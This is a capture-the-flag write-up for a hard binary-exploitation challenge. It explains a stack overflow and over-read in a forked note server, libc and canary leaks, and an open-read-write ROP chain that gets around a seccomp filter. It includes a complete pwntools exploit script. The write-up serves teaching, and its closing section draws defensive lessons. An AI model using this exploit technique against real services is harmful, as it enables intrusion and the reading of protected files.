# Dead Link (Deadnote) — A Beginner-Friendly Write-up

- **Category:** pwn (binary exploitation) / Hard
- **What makes it interesting:** an "anti-bot" gate you must solve programmatically, a classic stack buffer overflow, leaking libc **and** the stack canary from a single over-read (no brute force!), and — because there's no shell allowed — an "open-read-write" (ORW) ROP chain to steal the flag.
- **Server:** `nc 172.16.38.22 6657` (backup on `.21`)
- **Flag:** `bcsctf{st4ck_0rw_1n_c0ld_st0r4g3_n0_sh3ll_4ll0w3d}`

---

## 0. What you need to know first (the crash course)

If you're new to pwn, read this — the rest of the write-up leans on these words.

- **PIE** — the program loads at a *random* base address each run. We need to leak one real address, then subtract a known offset to recover the base. Every other address becomes `base + known_offset`.
- **Full RELRO** — the GOT (function-pointer table) is read-only, so we can't overwrite it.
- **Stack canary** — a random secret value the compiler places just before the saved return address. If a buffer overflow overwrites the return address, it also clobbers the canary; the program checks the canary before returning and *kills itself* if it changed. So to overflow past it, we must know the canary's value and write it back unchanged.
- **NX** — the stack is non-executable, so we can't inject shellcode. We use **ROP** instead.
- **ROP (Return-Oriented Programming)** — chain tiny existing code snippets ("gadgets", each ending in `ret`) to perform syscalls by hand.
- **libc** — the C standard library. Leak its base and you get all its functions and gadgets.
- **seccomp** — a syscall filter. Here it blocks `execve` (no shell) and `open`, but *allows* `openat`, `read`, `write`. That combination forces the **ORW** approach: **O**pen the flag, **R**ead it, **W**rite it back to us.
- **fork()** — the server spawns a *fresh child process* to handle each "read". If a child crashes (say, from a wrong canary guess), only the child dies — the server keeps running. This is what makes the overflow safe to experiment with.

---

## 1. The program: a "cold storage" note manager

`deadnote` is a 64-bit menu program for storing "memos". You reach the menu only after passing a "prove you're human" gate. It has **every mitigation turned on**: Full RELRO, canary, NX, PIE, and seccomp.

The challenge description is the whole hint:

> *"the viewer spawns a fresh worker to thaw each page — a torn page only ever costs a worker, never the vault."*

In plain terms: **each "Read a memo" runs in a `fork()`ed child**, so crashing a child doesn't kill the server. That's exactly what makes memory corruption practical here — we can fail as many times as we want.

---

## 2. Reversing (understanding the binary)

### The gate (proving you're "human")

1. It reads 32 random bytes (`gate_token`) from `/dev/urandom`.
2. It prints a **PIE leak**: `Diagnostics: system() @ <address>`. This is actually the address of an internal function at offset `0x12b9`, so `pie_base = leak - 0x12b9`. (Free PIE leak, handed to us.)
3. It prints the 32 token bytes as hex.
4. It reads 32 bytes back and, for each byte `i`, checks:
   ```
   ((13*i) ^ input[i] ^ 0xa5) & 0xff == token[i]
   ```
   So the correct answer is: `input[i] = token[i] ^ 0xa5 ^ ((13*i) & 0xff)`. We just compute that in Python and send it.

### The seccomp filter

- Default action: **ALLOW**, except:
  - `execve` → **KILL** (no shell)
  - `execveat` → **KILL**
  - `open` → returns error `EACCES`
- But `openat`, `read`, `write`, `mprotect`, … are **allowed**.

This is the textbook setup for an **ORW** challenge: we can't spawn a shell, so we open the flag file with `openat`, read it, and write it back to ourselves.

### The menu and the bug

The menu option *numbers* are shuffled every run, so the exploit parses the text labels ("Write a memo", "Read a memo", "Remove a memo") to find the right numbers.

"Read a memo" is the interesting one — it `fork()`s a child and runs the vulnerable function:

```c
char buf[0x110];                    // buffer is 0x110 bytes on the stack
for (i = 0; i < memo_sz[idx]; i++)  // but memo_sz can be up to 0x280!
    buf[i] = memos[idx][i];         // copies WAY more than buf can hold
fwrite(buf, 1, 0x100, stdout);      // always prints 0x100 bytes
```

Two bugs fall out of this:

- **Overflow:** the memo size can be up to `0x280`, but `buf` is only `0x110` bytes. Any memo larger than `0x108` bytes overflows into the canary, saved base pointer, and return address — inside the forked child.
- **Leak:** `fwrite` always prints `0x100` bytes even for a 1-byte memo. So the tail of `buf` is **uninitialized stack memory** that leaks straight back to us.

---

## 3. The exploit, step by step

### Step 1 — Pass the gate

Read the `system() @ ...` line → compute `pie_base = leak - 0x12b9`. Read the token hex, XOR each byte per the formula above, send the 32-byte answer.

### Step 2 — Leak libc + canary from ONE over-read (no brute force!)

Write a 1-byte memo, then read it → we get `0x100` bytes of stale stack. We slice it into 8-byte values (qwords) and hunt for two things:

- **libc base:** one of those qwords is a pointer to `&_IO_2_1_stdin_` (a known libc data symbol). We test candidates: `base = value - stdin_offset` must be page-aligned and in the right address range, and we confirm it by checking that a *second* libc pointer (or `&_IO_2_1_stdout_`) also falls inside the mapping. Auto-detecting this way works across different glibc versions — no hardcoded offsets.
- **the stack canary:** it's an 8-byte value whose lowest byte is `0x00` and which isn't a pointer or zero. We collect all such candidates, then *confirm* each cheaply: write `'A'*0x108 + p64(candidate)` and read. If the child says `[+] page served`, the canary matched (child survived the return check); `[-] the page resisted` means we guessed wrong and the child was killed. The `fork()` design makes this safe to try repeatedly.

### Step 3 — Build the ORW ROP chain

The binary itself has almost no useful gadgets, but now we have libc, which has plenty. We grab: `pop rax`, `pop rdi`, `pop rsi`, `pop rdx; pop rbx`, and `syscall; ret`.

The overflow layout (offsets from the start of `buf`):

```
0x000 : 'A' * 0x108      <- padding to reach the canary
0x108 : p64(canary)      <- write the real canary back so the check passes
0x110 : p64(fake_rbp)    <- a writable address (unused by the chain)
0x118 : ROP chain        <- runs when the function returns
```

The chain performs classic ORW using pure syscalls:

```
read (0, PATH, 0x100)             # we then send "flag.txt\0" as the filename
openat(AT_FDCWD, PATH, O_RDONLY)  # -> file descriptor 3
read (3, FLAG, 0x100)             # read flag into a scratch buffer
write(1, FLAG, 0x100)             # print it to us
```

- `PATH` and `FLAG` are scratch addresses in the binary's writable page (`pie+0x4600` / `pie+0x4700`).
- We use `openat` because seccomp broke plain `open`.
- `AT_FDCWD` + the relative name `flag.txt` works because the server runs the binary from the directory containing the flag.
- The whole thing fits in `0x258`, under the `0x280` size limit.

Because the ROP runs inside the forked child whose stdin/stdout are our socket, the flag comes straight back to us.

### Step 4 — Result

```
[+] PIE base = 0x6113557f3000
[+] libc base = 0x74c9b30f1000
[+] canary    = 0x3e3453834edc6c00
[+] FLAG: bcsctf{st4ck_0rw_1n_c0ld_st0r4g3_n0_sh3ll_4ll0w3d}
```

---

## 4. The full exploit script

```python
#!/usr/bin/env python3
import os
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

MODE = sys.argv[1] if len(sys.argv) > 1 else 'local'
HERE = os.path.dirname(os.path.abspath(__file__))

if MODE == 'remote':
    HOST = sys.argv[2] if len(sys.argv) > 2 else '172.16.38.22'
    PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 6657
    io = remote(HOST, PORT)
    libc = ELF(os.path.join(HERE, "libc.so.6"), checksec=False)   # Ubuntu 22.04 glibc 2.35
else:
    io = process(os.path.join(HERE, "deadnote"), cwd=HERE)
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

# ---------------- gate ----------------
io.recvuntil(b"system() @ ")
leak = int(io.recvline().strip(), 16)
pie = leak - 0x12b9
log.success("PIE base = %#x", pie)
io.recvuntil(b"Token: ")
tok = bytes.fromhex(io.recvline().strip().decode())
resp = bytes([tok[i] ^ 0xa5 ^ ((13*i) & 0xff) for i in range(32)])
io.recvuntil(b"> ")
io.send(resp)

# ---------------- parse menu ----------------
d = io.recvuntil(b"$ ")
opt = {}
for line in d.split(b"\n"):
    line = line.strip()
    if b")" in line:
        try:
            n = int(line.split(b")")[0])
        except:
            continue
        opt[line.split(b")", 1)[1].strip().lower()] = n
WRITE  = opt[b'write a memo']
READ   = opt[b'read a memo']
REMOVE = opt[b'remove a memo']
log.info("WRITE=%d READ=%d REMOVE=%d", WRITE, READ, REMOVE)

def write_memo(size, data):
    io.sendline(str(WRITE).encode())
    io.recvuntil(b"[*] Size?"); io.sendline(str(size).encode())
    io.recvuntil(b"[*] Data?"); io.send(data.ljust(size, b'A')[:size])
    io.recvuntil(b"[+] memo frozen")

def remove_memo(idx):
    io.sendline(str(REMOVE).encode())
    io.recvuntil(b"[*] Index?\n"); io.sendline(str(idx).encode())
    io.recvuntil(b"[+]")

def start_read(idx):
    io.sendline(str(READ).encode())
    io.recvuntil(b"[*] Index?\n"); io.sendline(str(idx).encode())

# ---------------- leak: dump uninitialized stack via small memo ----------------
write_memo(1, b"Z")
start_read(0)
buf = io.recvn(0x100)
io.recvuntil(b"page served")
remove_memo(0)

qs = [u64(buf[i:i+8]) for i in range(0, 0x100, 8)]
qset = set(qs)

# --- auto-detect libc base: slot holding &_IO_2_1_stdin_ ---
# The candidate base = v - stdin_off must be page aligned, and validated either by
# &_IO_2_1_stdout_ also being present, or by a 2nd libc pointer inside the mapping.
stdin_off  = libc.symbols['_IO_2_1_stdin_']
stdout_off = libc.symbols['_IO_2_1_stdout_']
LIBC_SPAN  = 0x260000
libc_base = None
for v in qs:
    b = v - stdin_off
    if b <= 0x100000 or b % 0x1000 != 0 or not (0x400000000000 <= b < 0x800000000000):
        continue
    if (b + stdout_off) in qset or sum(1 for x in qs if b <= x < b + LIBC_SPAN) >= 2:
        libc_base = b
        break
assert libc_base is not None, "could not locate libc pointer in leak: %s" % [hex(x) for x in qs]
libc.address = libc_base
log.success("libc base = %#x", libc.address)

# --- canary candidates: 8-byte values ending in 0x00, not pointers/zero ---
def is_ptr(v):
    return (0x550000000000 <= v < 0x570000000000) or (0x7f0000000000 <= v < 0x800000000000)
cands = [v for v in qs if v not in (0,) and (v & 0xff) == 0 and not is_ptr(v)]
log.info("canary candidates: %s", [hex(c) for c in cands])

def test_canary(c):
    write_memo(0x110, b'A'*0x108 + p64(c))
    start_read(0)
    r = io.recvuntil([b"page served", b"the page resisted"], timeout=4)
    remove_memo(0)
    return b"page served" in r

canary = None
for c in cands:
    if test_canary(c):
        canary = c
        break
assert canary is not None, "canary not found among candidates"
log.success("canary    = %#x", canary)

# ---------------- build ORW ROP ----------------
g_rax = next(libc.search(asm('pop rax; ret'), executable=True))
g_rdi = next(libc.search(asm('pop rdi; ret'), executable=True))
g_rsi = next(libc.search(asm('pop rsi; ret'), executable=True))
g_rdx = next(libc.search(asm('pop rdx; pop rbx; ret'), executable=True))
g_sys = next(libc.search(asm('syscall; ret'), executable=True))

PATH = pie + 0x4600
FLAG = pie + 0x4700
AT_FDCWD = 0xffffffffffffff9c

def sc(nr, a, b, c):
    return (p64(g_rax) + p64(nr) +
            p64(g_rdi) + p64(a) +
            p64(g_rsi) + p64(b) +
            p64(g_rdx) + p64(c) + p64(0) +
            p64(g_sys))

rop  = sc(0,   0,        PATH, 0x100)   # read(0, PATH, 0x100)  -> filename
rop += sc(257, AT_FDCWD, PATH, 0)       # openat(AT_FDCWD, PATH, O_RDONLY) -> fd 3
rop += sc(0,   3,        FLAG, 0x100)   # read(3, FLAG, 0x100)
rop += sc(1,   1,        FLAG, 0x100)   # write(1, FLAG, 0x100)

payload  = b'A'*0x108 + p64(canary) + p64(pie + 0x4900) + rop
log.info("payload size = %#x (max 0x280)", len(payload))
assert len(payload) <= 0x280

write_memo(len(payload), payload)
start_read(0)
io.recvn(0x100)          # buffer dump from fwrite
io.recvline()            # trailing newline
io.send(b"flag.txt\x00") # deliver filename to read(0,...)

data = io.recvall(timeout=6)
print("===== OUTPUT =====")
print(data)
import re
m = re.search(rb'bcsctf\{[^}]*\}', data)
if m:
    log.success("FLAG: %s", m.group().decode())
io.close()
```

### How to run

```bash
python3 exploit.py remote 172.16.38.22 6657   # against the server
python3 exploit.py local                       # locally (needs the deadnote binary + libc)
```

You also need `libc.so.6` (Ubuntu 22.04 glibc 2.35) next to the script for correct remote offsets, plus `pwntools`.

---

## 5. Lessons (why these bugs happened)

- **A `fork()` worker per request turns a canary into a soft wall.** Because a wrong guess only kills a child, an attacker can *test* candidate canary values instead of brute-forcing blind — and can leak-then-pwn without ever taking the service down.
- **"`open` blocked but `openat` allowed" is a super common seccomp mistake.** If you're going to sandbox file access, you have to block *all* the syscalls that open files, not just `open`. ORW still works through `openat`.
- **An over-read is as dangerous as an over-write.** `fwrite`-ing a fixed `0x100` bytes regardless of the real memo length leaked both a libc pointer *and* a saved canary — everything needed to defeat PIE and the canary, with zero brute force.
- **All mitigations on ≠ safe.** Full RELRO, PIE, canary, and NX were all enabled, and the challenge still fell to a straightforward overflow because the leak handed us the two secrets (libc base + canary) that those mitigations rely on staying secret.
